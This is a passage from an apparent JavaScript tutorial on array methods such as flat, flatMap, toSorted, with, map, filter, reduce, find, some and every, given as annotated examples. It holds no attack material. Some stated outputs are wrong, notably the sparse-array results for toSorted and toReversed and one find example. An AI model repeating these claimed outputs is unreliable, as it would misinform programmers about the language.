  return user.permissions.includes('admin') || user.permissions.includes('delete');
}

// Avoiding nested arrays for includes
let arr = [[1, 2], [3, 4]];
arr.includes([1, 2]);       // false (different array objects)

// For nested checks, use some
arr.some(subArr => subArr.includes(1));  // true

// Blacklist checking
const bannedWords = ['badword1', 'badword2'];
function isClean(text) {
  return !bannedWords.some(word => text.toLowerCase().includes(word));
}

// Note: includes vs indexOf
// includes: clearer intent, handles NaN correctly
// indexOf: can get position

// Prefer includes for existence check
arr.includes(value);        // âœ“
arr.indexOf(value) !== -1;  // âœ— (verbose)
```

---

### 7.3.6 flat() and flatMap()

**flat()** creates a new array with all sub-array elements concatenated into it recursively up to the specified depth.

**flatMap()** maps each element using a mapping function, then flattens the result by one level.

```javascript
// Flatten one level
let nested = [[1, 2], [3, 4]];
let flat = nested.flat();
flat                        // [1, 2, 3, 4]

// Flatten multiple levels
let deep = [1, [2, [3, [4, 5]]]];
let flat1 = deep.flat();
flat1                       // [1, 2, [3, [4, 5]]]

let flat2 = deep.flat(2);
flat2                       // [1, 2, 3, [4, 5]]

let flat3 = deep.flat(3);
flat3                       // [1, 2, 3, 4, 5]

// Flatten completely
let flat = deep.flat(Infinity);
flat                        // [1, 2, 3, 4, 5]

// Removing holes
let sparse = [1, , 3, , [5, , 7]];
let flat = sparse.flat();
flat                        // [1, 3, 5, 7] - holes removed!

// flatMap - map then flatten by one level
let arr = [1, 2, 3];
let result = arr.flatMap(x => [x, x * 2]);
result                      // [1, 2, 2, 4, 3, 6]

// Single level flattening
let arr = [[1, 2], [3, 4]];
let result = arr.flatMap(x => x);
result                      // [1, 2, 3, 4]
// Same as flat(1)

// With conditional mapping
let arr = [1, 2, 3, 4, 5];
let result = arr.flatMap(x => x % 2 === 0 ? [x, x * 2] : []);
result                      // [2, 4, 4, 8] - only even numbers, with doubled

// Transforming then flattening
let people = [
  { name: 'Alice', hobbies: ['reading', 'coding'] },
  { name: 'Bob', hobbies: ['gaming', 'sports'] }
];

let allHobbies = people.flatMap(p => p.hobbies);
allHobbies                  // ['reading', 'coding', 'gaming', 'sports']

// Generating sequences
let ranges = [[1, 3], [5, 6], [8, 10]];
let expanded = ranges.flatMap(([start, end]) => {
  return Array.from({ length: end - start + 1 }, (_, i) => start + i);
});
expanded                    // [1, 2, 3, 5, 6, 8, 9, 10]

// Index in flatMap
let arr = ['a', 'b', 'c'];
let result = arr.flatMap((x, i) => [i, x]);
result                      // [0, 'a', 1, 'b', 2, 'c']

// This binding in flatMap
let result = arr.flatMap(function(x, i) {
  return [this.prefix + x];
}, { prefix: '> ' });
result                      // ['> a', '> b', '> c']

// Combining flat and map
let data = [
  { items: [1, 2, 3] },
  { items: [4, 5] },
  { items: [6] }
];

// Approach 1: flatMap
let all = data.flatMap(d => d.items);

// Approach 2: map then flat
let all = data.map(d => d.items).flat();

// Both give [1, 2, 3, 4, 5, 6]

// Complex transformations
let matrix = [[1, 2], [3, 4]];
let transposed = matrix[0].map((_, colIndex) =>
  matrix.flatMap(row => row[colIndex])
);
// [[1, 3], [2, 4]]

// Grouping then flattening
let items = [1, 2, 3, 4, 5];
let grouped = items.reduce((acc, x) => {
  let group = Math.floor(x / 2);
  if (!acc[group]) acc[group] = [];
  acc[group].push(x);
  return acc;
}, []);

let result = grouped.flatMap(g => g);
// [1, 2], [3, 4], [5]

// Depth example
let arr = [1, [2, [3, [4]]]];
arr.flat(0);                // [1, [2, [3, [4]]]] - no flattening
arr.flat(1);                // [1, 2, [3, [4]]]
arr.flat(2);                // [1, 2, 3, [4]]
arr.flat(3);                // [1, 2, 3, 4]
arr.flat(Infinity);         // [1, 2, 3, 4]

// Performance note
// flat() creates new arrays, O(n) complexity
// For frequently used data, consider storage format
```

---

### 7.3.7 toReversed(), toSorted(), toSpliced() (ES2023)

These are non-mutating versions of reverse(), sort(), and splice(). They were added in ES2023.

```javascript
// toReversed() - non-mutating reverse
let arr = [1, 2, 3, 4, 5];
let reversed = arr.toReversed();
reversed                    // [5, 4, 3, 2, 1]
arr                         // [1, 2, 3, 4, 5] - unchanged

// Original reverse() mutates
arr.reverse();              // arr is now [5, 4, 3, 2, 1]

// toSorted() - non-mutating sort
let arr = [3, 1, 4, 1, 5];
let sorted = arr.toSorted();
sorted                      // [1, 1, 3, 4, 5]
arr                         // [3, 1, 4, 1, 5] - unchanged

// With comparator
let arr = [30, 1, 4, 10];
let sorted = arr.toSorted((a, b) => a - b);
sorted                      // [1, 4, 10, 30]
arr                         // [30, 1, 4, 10] - unchanged

// toSpliced() - non-mutating splice
let arr = [1, 2, 3, 4, 5];
let result = arr.toSpliced(2, 2, 'a', 'b');
result                      // [1, 2, 'a', 'b', 5]
arr                         // [1, 2, 3, 4, 5] - unchanged

// toSpliced with removal only
let arr = [1, 2, 3, 4, 5];
let result = arr.toSpliced(1, 2);
result                      // [1, 4, 5]
arr                         // [1, 2, 3, 4, 5] - unchanged

// toSpliced with insertion only
let arr = [1, 2, 5];
let result = arr.toSpliced(2, 0, 3, 4);
result                      // [1, 2, 3, 4, 5]
arr                         // [1, 2, 5] - unchanged

// Functional programming benefit
let arr = [3, 1, 4];
let sorted1 = arr.toSorted();
let sorted2 = arr.toSorted((a, b) => b - a);
// arr unchanged, multiple sorted versions created

// Chaining operations
let arr = [3, 1, 4, 1, 5];
let result = arr
  .toSorted((a, b) => a - b)
  .toReversed()
  .toSpliced(0, 1);  // Remove first element
result                      // [5, 4, 3, 1] - after sort desc, remove 1

// Immutable data patterns
let state = [3, 1, 4];
let newState = state.toSorted();
// oldState === state, newState !== state

// Sparse arrays
let sparse = [3, , 1];
let sorted = sparse.toSorted();
sorted                      // [1, 3] - sparse becomes dense with toReversed

let reversed = sparse.toReversed();
reversed                    // [1, empty, 3]

let spliced = sparse.toSpliced(0, 1, 0);
spliced                     // [0, empty, 1]
```

---

### 7.3.8 with() (ES2023)

**with()** returns a new array with the element at the specified index replaced with the given value.

```javascript
// Replace element at index
let arr = [1, 2, 3, 4, 5];
let newArr = arr.with(2, 99);
newArr                      // [1, 2, 99, 4, 5]
arr                         // [1, 2, 3, 4, 5] - unchanged

// Negative index
let arr = [1, 2, 3, 4, 5];
let newArr = arr.with(-1, 99);  // Replace last element
newArr                      // [1, 2, 3, 4, 99]
arr                         // [1, 2, 3, 4, 5] - unchanged

// with() out of range throws error
let arr = [1, 2, 3];
let newArr = arr.with(10, 99);  // RangeError

// Using with to update immutably
let data = [
  { id: 1, value: 10 },
  { id: 2, value: 20 },
  { id: 3, value: 30 }
];

let updated = data.with(1, { ...data[1], value: 99 });
updated[1].value            // 99
data[1].value               // 20 - unchanged

// with vs direct assignment
let arr = [1, 2, 3];

// Mutating (avoid)
arr[1] = 99;
arr                         // [1, 99, 3]

// Non-mutating
let arr2 = arr.with(1, 99);
arr                         // [1, 2, 3] - still original
arr2                        // [1, 99, 3]

// with() with transformation
let arr = [1, 2, 3, 4, 5];
let doubled = arr.with(2, arr[2] * 2);
doubled                     // [1, 2, 6, 4, 5]

// Multiple updates (requires multiple with() calls or spread)
let arr = [1, 2, 3, 4, 5];
let modified = arr.with(1, 99).with(3, 88);
modified                    // [1, 99, 3, 88, 5]

// Or with spread (better for multiple)
let modified = [...arr];
modified[1] = 99;
modified[3] = 88;

// Sparse arrays
let sparse = [1, , 3];
let dense = sparse.with(1, 2);
dense                       // [1, 2, 3] - hole becomes element

// with in state management
let state = { items: [1, 2, 3] };
let newState = {
  ...state,
  items: state.items.with(0, 99)
};
newState.items              // [99, 2, 3]
state.items                 // [1, 2, 3] - unchanged
```

**Best Practices:**

```javascript
// âœ“ Use non-mutating methods for immutable patterns
let arr = [1, 2, 3];
let result = arr.toSorted();  // Non-mutating

// âœ— Avoid mutation when immutability matters
arr.sort();                 // Mutates original

// âœ“ Use with() for single element updates in immutable contexts
let newArr = arr.with(0, 99);

// âœ“ Spread is still useful for multiple updates
let modified = [
  99,
  arr[1],
  arr[2],
  88
];

// âœ“ ES2023 methods are great for functional code
let sorted = items
  .toSorted((a, b) => a.priority - b.priority)
  .toReversed()
  .map(item => item.name);
```
## 7.4 Iteration Methods

**Iteration methods** execute a function on each array element, enabling powerful functional programming patterns. They're crucial for modern JavaScript development.

---

### 7.4.1 forEach()

**forEach()** executes a provided function once for each array element. It always returns `undefined`.

```javascript
// Basic iteration
let arr = [1, 2, 3];
arr.forEach(element => {
  console.log(element);     // 1, 2, 3
});

// With index
let arr = ['a', 'b', 'c'];
arr.forEach((element, index) => {
  console.log(`${index}: ${element}`);  // 0: a, 1: b, 2: c
});

// With array reference
let arr = [1, 2, 3];
arr.forEach((element, index, array) => {
  console.log(array);       // Prints the whole array each time
});

// Accumulating side effects
let sum = 0;
[1, 2, 3, 4, 5].forEach(x => {
  sum += x;
});
sum                         // 15

// Building a string
let result = '';
['a', 'b', 'c'].forEach(letter => {
  result += letter;
});
result                      // 'abc'

// Modifying objects in array
let items = [
  { id: 1, done: false },
  { id: 2, done: false }
];

items.forEach(item => {
  item.done = true;  // Mutates items
});

// items[0].done = true

// Return value ignored
let arr = [1, 2, 3];
let result = arr.forEach(x => x * 2);
result                      // undefined (always)

// Break not possible (unlike for loop)
let arr = [1, 2, 3, 4, 5];
arr.forEach(x => {
  if (x === 3) {
    // break;  // SyntaxError - forEach doesn't support break
    return;   // Skips current iteration, continues loop
  }
  console.log(x);           // 1, 2, 4, 5
});

// To break early, use some() or every()
arr.some(x => {
  console.log(x);
  return x === 3;           // Stops when true
});

// This binding
let obj = { multiplier: 2 };
let arr = [1, 2, 3];
arr.forEach(function(x) {
  console.log(x * this.multiplier);
}, obj);                    // 2, 4, 6

// Arrow function captures outer this
let obj = { multiplier: 2 };
arr.forEach(x => {
  console.log(x * obj.multiplier);  // 2, 4, 6
});

// Sparse arrays skip holes
let sparse = [1, , 3];
sparse.forEach(x => {
  console.log(x);           // 1, 3 (hole skipped)
});

// forEach on array-like objects
let arrayLike = { 0: 'a', 1: 'b', 2: 'c', length: 3 };
Array.prototype.forEach.call(arrayLike, (x, i) => {
  console.log(i, x);
});

// Converting NodeList to array using forEach
let elements = document.querySelectorAll('.item');
elements.forEach(el => {
  console.log(el);
});

// Chaining with map/filter (but prefer chaining)
let arr = [1, 2, 3, 4, 5];
arr
  .filter(x => x % 2 === 0)
  .forEach(x => {
    console.log(x * 2);      // 4, 8
  });

// Better to use map for transformation
arr
  .filter(x => x % 2 === 0)
  .map(x => x * 2);         // [4, 8]

// Common pattern: updating DOM
let items = [{ text: 'Item 1' }, { text: 'Item 2' }];
let ul = document.querySelector('ul');
ul.innerHTML = '';
items.forEach(item => {
  let li = document.createElement('li');
  li.textContent = item.text;
  ul.appendChild(li);
});

// Event listeners
let buttons = document.querySelectorAll('button');
buttons.forEach(btn => {
  btn.addEventListener('click', () => {
    console.log('Clicked:', btn.textContent);
  });
});

// Timeout/Interval with forEach
let tasks = ['task1', 'task2', 'task3'];
tasks.forEach((task, index) => {
  setTimeout(() => {
    console.log(task);
  }, (index + 1) * 1000);
});
```

**forEach vs for loop:**

```javascript
// forEach
arr.forEach(x => console.log(x));

// for loop
for (let x of arr) {
  console.log(x);
}

// for loop advantages:
// - Can break/continue
// - Can return from outer function
// - More control

// forEach advantages:
// - Cleaner, more functional
// - Built-in, no iterator protocol needed
// - Immutable iteration pattern

// Key difference: break/continue
let arr = [1, 2, 3, 4, 5];

// Works with for
for (let x of arr) {
  if (x === 3) break;       // Exits loop
  console.log(x);           // 1, 2
}

// Doesn't work with forEach
arr.forEach(x => {
  if (x === 3) return;      // Skips iteration, loop continues
  console.log(x);           // 1, 2, 4, 5
});
```

---

### 7.4.2 map()

**map()** transforms each element using a callback function and returns a new array with the results.

```javascript
// Basic transformation
let arr = [1, 2, 3];
let doubled = arr.map(x => x * 2);
doubled                     // [2, 4, 6]

// With index
let arr = ['a', 'b', 'c'];
let indexed = arr.map((x, i) => `${i}: ${x}`);
indexed                     // ['0: a', '1: b', '2: c']

// Object transformation
let users = [
  { name: 'Alice', age: 30 },
  { name: 'Bob', age: 25 }
];

let names = users.map(u => u.name);
names                       // ['Alice', 'Bob']

// Extracting property (common pattern)
let ages = users.map(u => u.age);
ages                        // [30, 25]

// Type conversion
let strings = ['1', '2', '3'];
let numbers = strings.map(Number);
numbers                     // [1, 2, 3]

// Chaining maps
let result = [1, 2, 3]
  .map(x => x * 2)          // [2, 4, 6]
  .map(x => x + 1);         // [3, 5, 7]
result                      // [3, 5, 7]

// Creating arrays
let result = [1, 2, 3].map(x => [x, x * 2]);
result                      // [[1, 2], [2, 4], [3, 6]]

// With array method
let numbers = ['1', '2', '3'];
let parsed = numbers.map(Number.parseInt);  // Careful! parseInt(string, radix)
// Actually gives [1, NaN, NaN] due to index parameter

// Better
let parsed = numbers.map(x => Number.parseInt(x, 10));
parsed                      // [1, 2, 3]

// String operations
let words = ['hello', 'world'];
let upper = words.map(w => w.toUpperCase());
upper                       // ['HELLO', 'WORLD']

// Math operations
let values = [1, 2, 3, 4, 5];
let squared = values.map(x => x ** 2);
squared                     // [1, 4, 9, 16, 25]

// Conditional mapping (use filter instead)
let arr = [1, 2, 3, 4, 5];
let result = arr.map(x => x % 2 === 0 ? x * 2 : null);
result                      // [null, 4, null, 8, null]

// Better
let result = arr
  .filter(x => x % 2 === 0)
  .map(x => x * 2);
result                      // [4, 8]

// This binding
let context = { multiplier: 3 };
let result = [1, 2, 3].map(function(x) {
  return x * this.multiplier;
}, context);
result                      // [3, 6, 9]

// Sparse arrays - holes preserved
let sparse = [1, , 3];
let result = sparse.map(x => x * 2);
result                      // [2, empty, 6] - hole preserved!

// Transforming dates
let dates = ['2024-01-15', '2024-02-20'];
let dateObjects = dates.map(d => new Date(d));
dateObjects[0].getFullYear(); // 2024

// HTML generation
let items = ['Apple', 'Banana', 'Cherry'];
let html = items.map(item => `<li>${item}</li>`).join('');
html                        // '<li>Apple</li><li>Banana</li><li>Cherry</li>'

// Creating objects
let ids = [1, 2, 3];
let objects = ids.map(id => ({ id, value: id * 10 }));
objects                     // [{id:1,value:10}, {id:2,value:20}, ...]

// With array reference
let arr = [1, 2, 3];
let result = arr.map((x, i, array) => {
  return x + (array[i + 1] || 0);
});
result                      // [3, 5, 3] - each + next

// Common pattern: transforming response
async function fetchUsers() {
  let response = await fetch('/api/users');
  let users = await response.json();
  return users.map(u => ({
    id: u.id,
    displayName: u.first_name + ' ' + u.last_name
  }));
}

// Using with other methods
let numbers = [1, 2, 3, 4, 5];
let result = numbers
  .filter(x => x > 2)       // [3, 4, 5]
  .map(x => x * 2)          // [6, 8, 10]
  .reduce((a, b) => a + b); // 24
```

---

### 7.4.3 filter()

**filter()** returns a new array with elements that pass a test function.

```javascript
// Basic filtering
let arr = [1, 2, 3, 4, 5];
let evens = arr.filter(x => x % 2 === 0);
evens                       // [2, 4]

// String filtering
let words = ['apple', 'ant', 'banana', 'apricot'];
let aWords = words.filter(w => w.startsWith('a'));
aWords                      // ['apple', 'ant', 'apricot']

// Object filtering
let users = [
  { name: 'Alice', age: 30 },
  { name: 'Bob', age: 25 },
  { name: 'Charlie', age: 35 }
];

let adults = users.filter(u => u.age >= 30);
adults                      // [Alice, Charlie]

// Remove nullish
let arr = [1, null, 2, undefined, 3, '', 0];
let clean = arr.filter(Boolean);  // Remove falsy: null, undefined, '', 0, false
clean                       // [1, 2, 3]

// Remove duplicates
let arr = [1, 2, 2, 3, 3, 3, 4];
let unique = arr.filter((x, i, a) => a.indexOf(x) === i);
unique                      // [1, 2, 3, 4]

// Or with Set
let unique = [...new Set(arr)];

// With index
let arr = ['a', 'b', 'c', 'd'];
let result = arr.filter((x, i) => i % 2 === 0);
result                      // ['a', 'c'] - even indices

// Complex conditions
let products = [
  { name: 'Laptop', price: 1000, inStock: true },
  { name: 'Mouse', price: 50, inStock: false },
  { name: 'Keyboard', price: 100, inStock: true }
];

let available = products.filter(p => p.inStock && p.price < 500);
available                   // [Keyboard]

// Chaining filters
let arr = [1, 2, 3, 4, 5, 6];
let result = arr
  .filter(x => x > 2)       // [3, 4, 5, 6]
  .filter(x => x % 2 === 0);
result                      // [4, 6]

// Better combined
let result = arr.filter(x => x > 2 && x % 2 === 0);
result                      // [4, 6]

// Filter + map
let products = [
  { name: 'Laptop', price: 1000, inStock: true },
  { name: 'Mouse', price: 50, inStock: false },
  { name: 'Keyboard', price: 100, inStock: true }
];

let available = products
  .filter(p => p.inStock)
  .map(p => p.name);
available                   // ['Laptop', 'Keyboard']

// Exclude pattern
let arr = [1, 2, 3, 4, 5];
let exclude3 = arr.filter(x => x !== 3);
exclude3                    // [1, 2, 4, 5]

// Or exclude array
let exclude = [2, 4];
let result = arr.filter(x => !exclude.includes(x));
result                      // [1, 3, 5]

// This binding
let context = { min: 30 };
let result = [20, 30, 40].filter(function(x) {
  return x >= this.min;
}, context);
result                      // [30, 40]

// Sparse arrays - holes excluded
let sparse = [1, , 3, , 5];
let result = sparse.filter(x => x > 2);
result                      // [3, 5] - holes not included

// Type checking
let mixed = [1, 'hello', true, null, 3.14, undefined];
let numbers = mixed.filter(x => typeof x === 'number');
numbers                     // [1, 3.14]

// Array validation
let items = [
  { id: 1 },
  { id: 2, name: 'Item' },
  { name: 'No ID' },
  { id: 3 }
];

let valid = items.filter(item => item.hasOwnProperty('id'));
valid                       // [Item 1, Item 2, Item 3]

// Searching in nested arrays
let comments = [
  { id: 1, replies: ['Good!', 'Nice'] },
  { id: 2, replies: [] },
  { id: 3, replies: ['Thanks'] }
];

let withReplies = comments.filter(c => c.replies.length > 0);
withReplies                 // [comment 1, comment 3]

// Performance note: filter + length > 0
let hasEven = arr.some(x => x % 2 === 0);  // Better
let hasEven = arr.filter(x => x % 2 === 0).length > 0;  // Unnecessary array creation

// Search implementation
function search(items, query) {
  let lowerQuery = query.toLowerCase();
  return items.filter(item =>
    item.name.toLowerCase().includes(lowerQuery)
  );
}

search(['Apple', 'Banana', 'Cherry'], 'app');  // ['Apple']
```

---

### 7.4.4 reduce() and reduceRight()

**reduce()** executes a reducer function on each element, resulting in a single value.

**reduceRight()** is like reduce() but processes elements from right to left.

```javascript
// Sum array
let arr = [1, 2, 3, 4, 5];
let sum = arr.reduce((acc, x) => acc + x, 0);
sum                         // 15

// Without initial value (starts with first element)
let arr = [1, 2, 3, 4, 5];
let sum = arr.reduce((acc, x) => acc + x);
sum                         // 15 (acc starts at 1)

// Product
let arr = [2, 3, 4];
let product = arr.reduce((acc, x) => acc * x, 1);
product                     // 24

// Building object
let items = ['apple', 'banana', 'cherry'];
let counts = items.reduce((acc, fruit) => {
  acc[fruit] = (acc[fruit] || 0) + 1;
  return acc;
}, {});
counts                      // { apple: 1, banana: 1, cherry: 1 }

// Grouping
let data = [
  { category: 'fruit', name: 'apple' },
  { category: 'fruit', name: 'banana' },
  { category: 'vegetable', name: 'carrot' }
];

let grouped = data.reduce((acc, item) => {
  let cat = item.category;
  acc[cat] = acc[cat] || [];
  acc[cat].push(item.name);
  return acc;
}, {});
// { fruit: ['apple', 'banana'], vegetable: ['carrot'] }

// Finding max value
let arr = [5, 2, 9, 1, 7];
let max = arr.reduce((acc, x) => x > acc ? x : acc);
max                         // 9

// Finding max object
let users = [
  { name: 'Alice', age: 30 },
  { name: 'Bob', age: 25 },
  { name: 'Charlie', age: 35 }
];

let oldest = users.reduce((oldest, user) =>
  user.age > oldest.age ? user : oldest
);
oldest                      // { name: 'Charlie', age: 35 }

// Flattening
let nested = [[1, 2], [3, 4], [5, 6]];
let flat = nested.reduce((acc, arr) => acc.concat(arr), []);
flat                        // [1, 2, 3, 4, 5, 6]

// Better: use flat()
let flat = nested.flat();   // [1, 2, 3, 4, 5, 6]

// Unique elements
let arr = [1, 2, 2, 3, 3, 3, 4];
let unique = arr.reduce((acc, x) => {
  if (!acc.includes(x)) acc.push(x);
  return acc;
}, []);
unique                      // [1, 2, 3, 4]

// Better: use Set
let unique = [...new Set(arr)];

// Array from string (frequency)
let str = 'hello';
let freq = str.split('').reduce((acc, char) => {
  acc[char] = (acc[char] || 0) + 1;
  return acc;
}, {});
freq                        // { h: 1, e: 1, l: 2, o: 1 }

// With index and array
let arr = [1, 2, 3, 4, 5];
let result = arr.reduce((acc, x, i, a) => {
  if (i === a.length - 1) {
    return acc + x;         // Last element, add
  }
  return acc + x * 0.5;     // Others, half
}, 0);
// 0.5 + 1 + 1.5 + 2 + 5 = 10

// reduceRight() - right to left
let arr = [1, 2, 3, 4, 5];
let result = arr.reduceRight((acc, x) => {
  acc.push(x);
  return acc;
}, []);
result                      // [5, 4, 3, 2, 1] - reversed

// String reverse
let str = 'hello';
let reversed = str.split('').reduceRight((acc, c) => acc + c);
reversed                    // 'olleh'

// But simpler
let reversed = str.split('').reverse().join('');

// Running through array from right
let arr = [1, 2, 3, 4, 5];
let result = arr.reduceRight((acc, x) => {
  return acc + x;           // Same as reduce
}, 0);
result                      // 15 (same result)

// Type conversions
let mixed = [1, 'hello', true, { x: 1 }];
let result = mixed.reduce((acc, x) => {
  switch(typeof x) {
    case 'number': return acc + x;
    case 'string': return acc + x.length;
    case 'boolean': return acc + (x ? 1 : 0);
    default: return acc;
  }
}, 0);
result                      // 7 (1 + 5 + 1)

// Pipeline/composition
let fns = [
  x => x * 2,
  x => x + 1,
  x => x ** 2
];

let compose = (value, functions) =>
  functions.reduce((acc, fn) => fn(acc), value);

compose(3, fns);            // ((3*2)+1)^2 = 49

// Common pattern: sum/average
let arr = [1, 2, 3, 4, 5];
let sum = arr.reduce((a, b) => a + b, 0);
let avg = sum / arr.length;
avg                         // 3

// Or in one reduce
let result = arr.reduce((acc, x, i, a) => {
  acc.sum += x;
  acc.avg = acc.sum / (i + 1);
  return acc;
}, { sum: 0, avg: 0 });
result.avg                  // 3

// Chaining transforms
let data = [1, 2, 3, 4, 5];
let result = data
  .filter(x => x > 2)
  .map(x => x * 2)
  .reduce((a, b) => a + b, 0);
result                      // 24 (3*2 + 4*2 + 5*2 = 6 + 8 + 10)
```

---

### 7.4.5 find() and findIndex()

**find()** returns the first element that passes a test function (or undefined if none found).

**findIndex()** returns the index of the first element that passes the test.

```javascript
// Finding first element
let arr = [1, 2, 3, 4, 5];
let found = arr.find(x => x > 3);
found                       // 4

// Not found
let found = arr.find(x => x > 10);
found                       // undefined

// Finding object
let users = [
  { id: 1, name: 'Alice' },
  { id: 2, name: 'Bob' },
  { id: 3, name: 'Charlie' }
];

let user = users.find(u => u.id === 2);
user                        // { id: 2, name: 'Bob' }

// findIndex - get position
let index = users.findIndex(u => u.id === 2);
index                       // 1

// Complex condition
let products = [
  { id: 1, name: 'Laptop', price: 1000 },
  { id: 2, name: 'Mouse', price: 50 },
  { id: 3, name: 'Keyboard', price: 100 }
];

let expensive = products.find(p => p.price > 500);
expensive                   // { Laptop object }

// First even number
let arr = [1, 3, 5, 4, 6];
let firstEven = arr.find(x => x % 2 === 0);
firstEven                   // 4

// findIndex for inserting
let arr = [10, 20, 30, 40];
let index = arr.findIndex(x => x > 25);
index                       // 2 - insert at this position

// String search
let strings = ['apple', 'apricot', 'banana', 'avocado'];
let aString = strings.find(s => s.startsWith('ap'));
aString                     // 'apple'

let aIndex = strings.findIndex(s => s.startsWith('ap'));
aIndex                      // 0

// With index parameter
let arr = [10, 20, 30, 40];
let result = arr.find((x, i) => x > i * 10);
result                      // 20 (at index 1, 20 > 10)

// Complex object matching
let user = users.find(u =>
  u.name.length > 3 && u.id !== 1
);
user                        // Alice, Bob, or Charlie (first match)

// Debugging with find
let arr = [1, 2, 3, 4, 5];
let found = arr.find(x => {
  console.log(`Checking ${x}`);
  return x > 3;             // Logs: 1, 2, 3, 4, then returns 4
});

// This binding
let obj = { threshold: 3 };
let arr = [1, 2, 3, 4, 5];
let result = arr.find(function(x) {
  return x > this.threshold;
}, obj);
result                      // 4

// Sparse arrays - holes skipped
let sparse = [1, , 3, , 5];
let found = sparse.find(x => x > 2);
found                       // 3

// Common use: getting ID by property
function getUserById(users, id) {
  return users.find(u => u.id === id);
}

// Database-like query
let records = [
  { id: 1, status: 'active' },
  { id: 2, status: 'inactive' },
  { id: 3, status: 'active' }
];

let activeRecord = records.find(r => r.status === 'active');
activeRecord                // { id: 1, status: 'active' }

let activeIndex = records.findIndex(r => r.status === 'active');
activeIndex                 // 0

// Cache pattern
let cache = [
  { key: 'user', value: { name: 'Alice' } },
  { key: 'settings', value: { theme: 'dark' } }
];

let cached = cache.find(c => c.key === 'user');
cached                      // { key: 'user', value: {...} }
```

---

### 7.4.6 findLast() and findLastIndex() (ES2023)

**findLast()** returns the last element that passes a test (searches right to left).

**findLastIndex()** returns the index of the last matching element.

```javascript
// Finding last match
let arr = [1, 2, 3, 4, 3, 5];
let last = arr.findLast(x => x > 2);
last                        // 5

let lastIndex = arr.findLastIndex(x => x > 2);
lastIndex                   // 5

// Last occurrence of specific value
let arr = [1, 2, 3, 2, 1];
let last3 = arr.findLast(x => x === 3);
last3                       // 3

let index3 = arr.findLastIndex(x => x === 3);
index3                       // 2

// Objects - last match
let logs = [
  { level: 'info', msg: 'Start' },
  { level: 'error', msg: 'Connection failed' },
  { level: 'info', msg: 'Retry' },
  { level: 'error', msg: 'Retry failed' }
];

let lastError = logs.findLast(l => l.level === 'error');
lastError                   // { level: 'error', msg: 'Retry failed' }

// Search backwards more efficiently
let arr = [1, 2, 3, 4, 5];
let result = arr.findLast(x => x % 2 === 0);
result                      // 4 (last even, from right)

let index = arr.findLastIndex(x => x % 2 === 0);
index                       // 3

// Sparse arrays - holes skipped
let sparse = [1, , 3, , 5];
let last = sparse.findLast(x => x > 2);
last                        // 5

let lastIndex = sparse.findLastIndex(x => x > 2);
lastIndex                   // 4

// With index parameter
let arr = [10, 20, 30, 40, 50];
let result = arr.findLast((x, i) => {
  console.log(`Checking index ${i}: ${x}`);
  return x < 40;
});
// Checks: 4, 3, 2, 1, 0 (right to left)
// Returns 30

// Getting last element matching condition
let tasks = [
  { id: 1, completed: true },
  { id: 2, completed: false },
  { id: 3, completed: true },
  { id: 4, completed: false }
];

let lastComplete = tasks.findLast(t => t.completed);
lastComplete                // { id: 3, completed: true }

// Last index for insertion point
let sorted = [10, 20, 30, 40, 50];
let value = 25;
let insertIndex = sorted.findLastIndex(x => x < value) + 1;
insertIndex                 // 2 (insert at position 2)
```

---

### 7.4.7 some() and every()

**some()** returns true if at least one element passes the test.

**every()** returns true if all elements pass the test.

```javascript
// Some - at least one
let arr = [1, 2, 3, 4, 5];
let hasEven = arr.some(x => x % 2 === 0);
hasEven                     // true

// Every - all elements
let allEven = arr.every(x => x % 2 === 0);
allEven                     // false

// Validation patterns
let arr = [5, 10, 15, 20];
arr.some(x => x > 12);      // true
arr.every(x => x > 0);      // true

// Breaking from loop (some/every)
let arr = [1, 2, 3, 4, 5];
let found = arr.some(x => {
  console.log(x);
  return x === 3;           // Stops at 3
});
// Logs: 1, 2, 3 (stops early)

// Check all required fields
let form = [
  { name: 'email', value: 'test@example.com' },
  { name: 'password', value: 'secret' },
  { name: 'username', value: 'john' }
];

let allFilled = form.every(field => field.value.length > 0);
allFilled                   // true

// Check if any field empty
let anyEmpty = form.some(field => field.value.length === 0);
anyEmpty                    // false

// Type checking
let mixed = [1, 2, '3', 4];
let allNumbers = mixed.every(x => typeof x === 'number');
allNumbers                  // false

let hasString = mixed.some(x => typeof x === 'string');
hasString                   // true

// Array validation
let arrays = [[1, 2], [3, 4], [5]];
let allNonEmpty = arrays.every(a => a.length > 0);
allNonEmpty                 // true

let hasEmpty = arrays.some(a => a.length === 0);
hasEmpty                    // false

// User permission check
let users = [
  { name: 'Alice', admin: true },
  { name: 'Bob', admin: false },
  { name: 'Charlie', admin: false }
];

let anyAdmin = users.some(u => u.admin);
anyAdmin                    // true

let allAdmin = users.every(u => u.admin);
allAdmin                    // false

// Password strength validation
function isStrongPassword(pwd) {
  return pwd.length >= 8 &&
    /[A-Z]/.test(pwd) &&    // Has uppercase
    /[a-z]/.test(pwd) &&    // Has lowercase
    /[0-9]/.test(pwd) &&    // Has number
    /[!@#$]/.test(pwd);     // Has special char
}

// Game state
let players = [
  { name: 'Alice', score: 100 },
  { name: 'Bob', score: 85 },
  { name: 'Charlie', score: 0 }
];

let gameOver = players.some(p => p.score >= 100);
gameOver                    // true

let allScored = players.every(p => p.score > 0);
allScored                   // false

// Data consistency check
let data = [{ id: 1 }, { id: 2 }, { id: 3 }];
let hasId = data.every(item => item.hasOwnProperty('id'));
hasId                       // true

// Index parameter
let arr = [1, 2, 3, 4, 5];
let result = arr.some((x, i) => x > i * 2);
result                      // true (finds element > index*2)

// Sparse arrays - holes are skipped
let sparse = [1, , 3, , 5];
let allTrue = sparse.every(x => x > 0);
allTrue                     // true (holes skipped)

// Double-check requirement
let items = [
  { name: 'Item 1', verified: true },
  { name: 'Item 2', verified: false }
];

let allVerified = items.every(i => i.verified);
if (!allVerified) {
  console.log('Some items not verified');
}

// Early exit performance
let arr = Array(1000000).fill(1);

// Very fast with some (stops early)
let hasDuplicate = arr.some((x, i) => arr[i + 1] === x);

// Much slower with every on all
let allUnique = arr.every((x, i) => arr[i + 1] !== x);
```

---

### 7.4.8 keys(), values(), and entries()

These methods return iterators for array keys, values, and [key, value] pairs.

```javascript
// keys() - array indices
let arr = ['a', 'b', 'c'];
let keys = arr.keys();
[...keys]                   // [0, 1, 2]

// values() - array elements
let values = arr.values();
[...values]                 // ['a', 'b', 'c']

// entries() - [index, element] pairs
let entries = arr.entries();
[...entries]                // [[0, 'a'], [1, 'b'], [2, 'c']]

// Iterating keys
let arr = ['x', 'y', 'z'];
for (let key of arr.keys()) {
  console.log(key);         // 0, 1, 2
}

// Iterating values
for (let value of arr.values()) {
  console.log(value);       // 'x', 'y', 'z'
}

// Iterating entries
